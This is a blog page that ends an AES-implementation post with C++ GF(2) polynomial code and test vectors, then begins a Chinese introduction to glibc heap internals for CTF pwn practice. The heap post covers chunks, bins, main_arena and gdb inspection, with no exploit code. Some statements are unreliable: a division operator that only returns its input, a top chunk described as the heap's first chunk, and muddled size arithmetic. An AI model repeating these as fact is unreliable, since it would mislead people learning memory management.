class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>=(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    m_deqPolynomial = kref_polyRight.m_deqPolynomial;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>=(PolynomialGF2 &amp;&amp;rvalue_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    m_deqPolynomial = <span class="built_in">std</span>::move(rvalue_polyRight.m_deqPolynomial);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>+(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iLeftHeighestBitIext = polyResult.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">if</span> (iRightHeighestBitIndex &gt; iLeftHeighestBitIext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> iGap = iRightHeighestBitIndex - iLeftHeighestBitIext;</span><br><span class="line">        polyResult.Insert(iLeftHeighestBitIext + <span class="number">1</span>, iGap, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; (<span class="keyword">size_t</span>)(iRightHeighestBitIndex + <span class="number">1</span>); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult[cntI] ^= ref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>-(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iLeftHeighestBitIext = polyResult.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">if</span> (iRightHeighestBitIndex &gt; iLeftHeighestBitIext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> iGap = iRightHeighestBitIndex - iLeftHeighestBitIext;</span><br><span class="line">        polyResult.Insert(iLeftHeighestBitIext + <span class="number">1</span>, iGap, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; ref_polyRight.GetSize(); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult[cntI] ^= ref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>-(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> iRightHeighestBitIndex = ref_polyRight.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iLeftHeighestBitIext = polyResult.GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">if</span> (iRightHeighestBitIndex &gt; iLeftHeighestBitIext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> iGap = iRightHeighestBitIndex - iLeftHeighestBitIext;</span><br><span class="line">        polyResult.Insert(iLeftHeighestBitIext + <span class="number">1</span>, iGap, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; ref_polyRight.GetSize(); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult[cntI] ^= ref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>*(<span class="keyword">const</span> PolynomialGF2 &amp;ref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; ref_polyRight.GetSize(); cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        PolynomialGF2 polyTmp = *<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == ref_polyRight[cntI])</span><br><span class="line">        &#123;</span><br><span class="line">            polyTmp.Insert(<span class="number">0</span>, cntI, <span class="number">0</span>);</span><br><span class="line">            polyResult = polyResult + polyTmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>/(<span class="keyword">const</span> PolynomialGF2 &amp;kref_right)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; <span class="comment">//! Polynomial::operator/() END</span></span><br><span class="line">PolynomialGF2 PolynomialGF2::<span class="keyword">operator</span>%(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    PolynomialGF2 polyResult;</span><br><span class="line">    <span class="keyword">int</span> iLeftHightestBitIndex = GetHightestBitIndex();</span><br><span class="line">    <span class="keyword">int</span> iRightHightestBitIndex = kref_polyRight.GetHightestBitIndex();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iLeftHightestBitIndex == iRightHightestBitIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult = kref_polyRight - *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iLeftHightestBitIndex &lt; iRightHightestBitIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        polyResult = *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iLeftHightestBitIndex &gt; iRightHightestBitIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        PolynomialGF2 polyQuotient;</span><br><span class="line">        Division(kref_polyRight, polyQuotient, polyResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> polyResult;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>&lt;&lt;=(<span class="keyword">const</span> <span class="keyword">size_t</span> &amp;kref_uiNumber)</span><br><span class="line">&#123;</span><br><span class="line">    m_deqPolynomial.insert(m_deqPolynomial.cbegin(), kref_uiNumber, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (m_bEnableLeftMoveLimit &amp;&amp;</span><br><span class="line">        GetHightestBitIndex() &gt;= (<span class="keyword">int</span>)m_uiLeftMoveLimitBit)</span><br><span class="line">    &#123;</span><br><span class="line">        m_deqPolynomial.erase(<span class="built_in">std</span>::next(m_deqPolynomial.cbegin(),</span><br><span class="line">                                        m_uiLeftMoveLimitBit),</span><br><span class="line">                              m_deqPolynomial.cend());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125; </span><br><span class="line">PolynomialGF2 &amp;PolynomialGF2::<span class="keyword">operator</span>^=(<span class="keyword">const</span> PolynomialGF2 &amp;kref_polyRight)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> uiheighBit = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> uiLeftSize = m_deqPolynomial.size();</span><br><span class="line">    <span class="keyword">size_t</span> uiRightSize = kref_polyRight.GetSize();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> uiOperationSize = uiLeftSize;</span><br><span class="line">    <span class="keyword">if</span> (uiLeftSize &gt; uiRightSize)</span><br><span class="line">    &#123;</span><br><span class="line">        uiOperationSize = uiRightSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> cntI = <span class="number">0</span>; cntI &lt; uiOperationSize; cntI++)</span><br><span class="line">    &#123;</span><br><span class="line">        m_deqPolynomial[cntI] ^= kref_polyRight[cntI];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">master_key = <span class="number">0x2b7e151628aed2a6abf7158809cf4f3c</span></span><br><span class="line">plaintext = <span class="number">0x3243f6a8885a308d313198a2e0370734</span></span><br><span class="line">ciphertext = <span class="number">0x3925841d02dc09fbdc118597196a0b32</span></span><br><span class="line">encrypt：<span class="number">0x3925841d02dc09fbdc118597196a0b32</span></span><br><span class="line">decrypt：<span class="number">0x3243f6a8885a308d313198a2e0370734</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本实现了AES的基本加密算法的实现</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/ǳ̸Linux-Heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/07/ǳ̸Linux-Heap/" class="post-title-link" itemprop="url">浅谈Linux-Heap</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-07 09:58:17" itemprop="dateCreated datePublished" datetime="2019-10-07T09:58:17-07:00">2019-10-07</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-08 00:58:36" itemprop="dateModified" datetime="2019-10-08T00:58:36-07:00">2019-10-08</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近的CTF比赛单纯的栈溢出已经很少见了，基本都是堆题，所以被迫开始学习堆。堆的利用相对于栈溢出和格式化字符串会复杂很多，这里对堆的一些基本知识点和实现原理进行了一些小小的总结</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><blockquote>
<p>堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。</p>
</blockquote>
<p>先看看堆在虚拟内存中的位置</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/02.png" alt></p>
<p>堆不同于栈，堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的，且堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 <code>malloc</code>、<code>alloc</code>、<code>realloc</code> 函数分配内存后才会出现</p>
<p>初始时，堆的起始地址 <strong>start_brk</strong>以及堆的当前末尾 <strong>brk</strong>指向同一地址。根据是否开启 <strong>ASLR</strong>，两者的具体位置会有所不同</p>
<ul>
<li>不开启 <strong>ASLR</strong> 保护时，<strong>start_brk</strong> 以及 <strong>brk</strong> 会指向 <strong>data/bss</strong> 段的结尾。</li>
<li>开启 <strong>ASLR</strong> 保护时，<strong>start_brk</strong> 以及 <strong>brk</strong> 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p>在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<p>堆管理器处于用户程序与内核中间，主要做以下工作</p>
<ol>
<li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
<li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ol>
<p><strong>Linux操作系统中对堆操作的是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
<h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>我们都知道，在C中动态分配内存，使用的是<strong>malloc</strong>。其在<strong>GNU C(glibc)</strong>中的实现则是基于<strong>dlmalloc</strong>的<strong>ptmalloc</strong>。<strong>ptmalloc</strong>的基本思路是将堆上的内存区域划分为多个<strong>chunk</strong>，在分配/回收内存时，对<strong>chunk</strong>进行分割、回收等操作</p>
<p>具体地，每个<strong>chunk</strong>除了包含最终返回用户的那部分<strong>mem(user data (用户数据区))</strong>，还包含头部用于保存<strong>chunk</strong>大小的相关信息。在<strong>32</strong>位系统下，<strong>chunk</strong>头的大小为<strong>8 Bytes</strong>，且每个<strong>chunk</strong>的大小也是<strong>8 Bytes</strong>的整数倍</p>
<p>一个典型的<strong>chunk</strong>如下图所示：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/01.png" alt></p>
<p><strong>我们称前两个字段称为 chunk header，后面的部分称为 men（user data）。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong></p>
<p><strong>chunk</strong>头包括以下两部分：</p>
<table>
<thead>
<tr>
<th align="center">presize</th>
<th>只有在前面一个堆块是空闲的时候才有指，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>size</strong></td>
<td><strong>当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息</strong></td>
</tr>
</tbody></table>
<p><strong>size</strong>字段的最后<strong>3bit</strong>相当于三个 <strong>flag</strong> ，有另外的作用</p>
<table>
<thead>
<tr>
<th align="center">NON_MAIN_ARENA</th>
<th align="center">这个堆块是否位于主线程</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>IS_MAPPED</strong></td>
<td align="center"><strong>记录当前 chunk 是否是由 mmap 分配的</strong></td>
</tr>
<tr>
<td align="center"><strong>PREV_INUSE</strong></td>
<td align="center"><strong>记录前一个 chunk 块是否被分配</strong></td>
</tr>
</tbody></table>
<p>我们需要记住的是最后一位</p>
<blockquote>
<p><strong>PREV_INUSE：用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1</strong></p>
</blockquote>
<p>所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节，所以前一个堆块的释放与否都和这两个字段（<strong>pre_size、size</strong>）的值有关，这是因为便于内存的释放操作（<strong>free</strong>）</p>
<p>如果当前chunk处于未被使用状态，则<strong>mem</strong>前<strong>8 bytes</strong>被用来存储其他信息，具体如下：</p>
<table>
<thead>
<tr>
<th align="center">fd</th>
<th align="center">下一个未被使用的chunk的地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>bk</strong></td>
<td align="center"><strong>上一个未被使用的chunk的地址</strong></td>
</tr>
</tbody></table>
<p>可以看到，<strong>chunk</strong>头中包含的大小信息，主要用来在获取内存中相邻<strong>chunk</strong>的地址（当前<strong>chunk</strong>地址减去前一<strong>chunk</strong>的大小，为前一<strong>chunk</strong>的地址；当前<strong>chunk</strong>地址加上当前<strong>chunk</strong>的大小，为后一<strong>chunk</strong>的地址）。而<strong>mem</strong>中的<strong>fd</strong>和<strong>bk</strong>只在当前<strong>chunk</strong>处于未被使用时才有意义。<strong>chunk</strong> 处于分配状态时，从 <strong>fd</strong> 字段开始是用户的数据。如果了解数据结构，便可以立刻看出，这些未被使用的<strong>chunks</strong>通过<strong>fd</strong>, <strong>bk</strong>组成了链表。事实上，<strong>malloc</strong>确实维护了一系列链表用于内存的分配和回收，这些链表被成为<strong>“bins”</strong></p>
<p>一般来说，每个<strong>bin</strong>链表中的<strong>chunk</strong>都有相同或将近的大小。根据<strong>bin</strong>所包含<strong>chunk</strong>的大小，可以将<strong>bin</strong>分为<strong>fastbin</strong>, <strong>unsorted bin</strong>, <strong>small bin</strong>, <strong>large bin</strong></p>
<p>如果我们尝试使用<code>malloc(8)</code></p>
<p>申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21</p>
<p>1.第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</p>
<ul>
<li>在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</li>
<li>例如，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li>
</ul>
<p>2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）<br>3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）<br>4.最后一个 1 字节是 <strong>PREV_INUSE 的值，只有 0 或 1两个值</strong></p>
<h2 id="复杂结构"><a href="#复杂结构" class="headerlink" title="复杂结构"></a>复杂结构</h2><p>首先要明确用户在调用 malloc 函数时返回的值为<strong>一个指针，指向分配到堆空间（用户数据区）</strong>，这个在最前面的那个图片也已经标出来了。</p>
<p>有时候题目是以更复杂的情况，用指针来表示某个数据结构的，例如下面的这个例子：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/03.png" alt></p>
<table>
<thead>
<tr>
<th align="center">max_size</th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>exist_num</strong></td>
<td align="center"><strong>First_chunk</strong></td>
</tr>
<tr>
<td align="center"><strong>0/1</strong></td>
<td align="center"><strong>First_chunk</strong></td>
</tr>
<tr>
<td align="center"><strong>len(first)</strong></td>
<td align="center"><strong>First_chunk</strong></td>
</tr>
<tr>
<td align="center"><strong>point_heap</strong></td>
<td align="center"><strong>First_chunk</strong></td>
</tr>
<tr>
<td align="center"><strong>0/1</strong></td>
<td align="center"><strong>Second_chunk</strong></td>
</tr>
<tr>
<td align="center"><strong>len(second)</strong></td>
<td align="center"><strong>Second_chunk</strong></td>
</tr>
<tr>
<td align="center"><strong>point_heap</strong></td>
<td align="center"><strong>Second_chunk</strong></td>
</tr>
</tbody></table>
<p>左边的这个本身就是一个堆块，用来存放一些全局信息</p>
<table>
<thead>
<tr>
<th align="center">first chunk（second chunk）</th>
<th align="center">表示第一和第二个结构</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>point_heap</strong></td>
<td align="center"><strong>来指向存储用户数据的堆块（chunk）</strong></td>
</tr>
<tr>
<td align="center"><strong>max_size</strong></td>
<td align="center"><strong>能够存储的最大结构数量</strong></td>
</tr>
<tr>
<td align="center"><strong>exist_num</strong></td>
<td align="center"><strong>已经存储的结构的数量</strong></td>
</tr>
</tbody></table>
<h3 id="IDA-中常见的指针表示形式"><a href="#IDA-中常见的指针表示形式" class="headerlink" title="IDA 中常见的指针表示形式"></a>IDA 中常见的指针表示形式</h3><p>在 IDA 伪代码中的指针形式形如下面的情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(qword_6020A8 + 8)</span><br></pre></td></tr></table></figure>

<p><strong>表示取到 qword_6020A8 这个地址加 8 偏移的那个地址存储的值</strong></p>
<p>汇编代码等同于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F85                 mov     rax, cs:qword_6020A8</span><br><span class="line">.text:0000000000400F8C                 mov     rax, [rax+8]</span><br></pre></td></tr></table></figure>

<p>简单转化一下，也就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(addr) = [addr]</span><br></pre></td></tr></table></figure>

<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>在 pwn 的堆题目中，经常会有像一些”笔记管理系统”之类的题目，例如下面这里例子</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/04.png" alt></p>
<p>代码提供了最基本的增删查改的功能。这个”笔记”的数据结构<strong>通常就是使用链表连接起来的</strong>，记录了当前 note 的大小、属性、内容等等。</p>
<p><strong>例如，下面这个例子就是以指针为基础来存储这个 note 结构的</strong>。这里的 i 代表 note 的索引，若这里的 i = 0 时：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/05.png" alt></p>
<p><em>(qword_6020A8 + 16) 就*代表从 qword_6020A8 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址）</em></p>
<p>同样的 *(qword_6020A8 + 24) 就代表偏移 24 个字节处的值为 len</p>
<p>依次类推就可以在<strong>不连续的内存空间中</strong>，把整个 note 的数据结构存储下来了。</p>
<h2 id="申请堆块的本质"><a href="#申请堆块的本质" class="headerlink" title="申请堆块的本质"></a>申请堆块的本质</h2><blockquote>
<p>堆管理器 ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块</p>
</blockquote>
<p>ptmalloc2 的作用通俗的讲就是<strong>相当于一个”中间商”</strong>，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。</p>
<p>简单点说就是下面这个图中的情况：</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%A0%86%E5%85%A5%E9%97%A8/06.png" alt></p>
<p>这里的举一个最简单的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 gdb 中进行调试，在<code>call malloc</code>处下一个断点，<strong>在这里使用 vmmap 命令，查看内存分布</strong>。可以看到此时并没有发现堆段</p>
<p>在 gdb 中进行调试，在 call malloc 处下一个断点，<strong>在这里使用 vmmap 命令，查看内存分布</strong>。可以看到此时并没有发现堆段</p>
<p>单步 n ，vmmap 命令再次查看内存，发现出现了堆段</p>
<p>但是这里我们明明只是申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00602000     ~    0x00623000</span><br></pre></td></tr></table></figure>

<p>计算一下，刚好是 132 kB</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x00623000-0x00602000)/1024 = 132 kB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena</p>
</blockquote>
<p>也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物，<strong>以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了</strong>，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货</p>
<h3 id="查看已分配的堆内存分布"><a href="#查看已分配的堆内存分布" class="headerlink" title="查看已分配的堆内存分布"></a>查看已分配的堆内存分布</h3><p>在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 eax 中的</p>
<p>我们这里使用下面这个命令来查看内存堆块情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/32gx 0x602010-0x10</span><br></pre></td></tr></table></figure>

<ul>
<li>32位的程序使用 x/32xw 比较直观一点</li>
</ul>
<p>这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段）</p>
<h2 id="main-arena-与-top-chunk"><a href="#main-arena-与-top-chunk" class="headerlink" title="main_arena 与 top chunk"></a>main_arena 与 top chunk</h2><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><p>这个 main_arena 其实就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是相当于上面所说的”批发”到的一堆货物</p>
<blockquote>
<p>因为是主线程分配的，所以叫做main arena，通过增加 program break location 的方式来增加 main arena 的大小。</p>
</blockquote>
<p><strong>使用 brk 方式扩展内存的方式这里就不说了，感兴趣可以自己去查一下资料</strong></p>
<p>在 gdb 调试中，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/32gx &amp;main_arena</span><br></pre></td></tr></table></figure>

<p>可以看到 main_arena 的内存分配情况。</p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>顾名思义，是堆中第一个堆块。相当于一个”带头大哥”，程序以后分配到的内存到要放在他的后面。</p>
<blockquote>
<p>在系统当前的所有 free chunk(无论那种 bin)，都无法满足用户请求的内存大小的时候，将此 chunk 当做一个应急消防员，分配给用户使用。</p>
</blockquote>
<p>简单点说，也就是在程序在向堆管理器申请内存时，<strong>没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</strong></p>
<h2 id="free-函数和-bins"><a href="#free-函数和-bins" class="headerlink" title="free 函数和 bins"></a>free 函数和 bins</h2><p>bins 这个概念是与内存回收相关的，也就是堆管理器会根据用户已经申请到的内存空间大小进行释放，<strong>来决定放入哪类 bins 当作去</strong>。bins 直接翻译过来就是”垃圾桶”的意思，所以在系统在决定使用哪个 bins 时可以看作为”垃圾的分类”。</p>
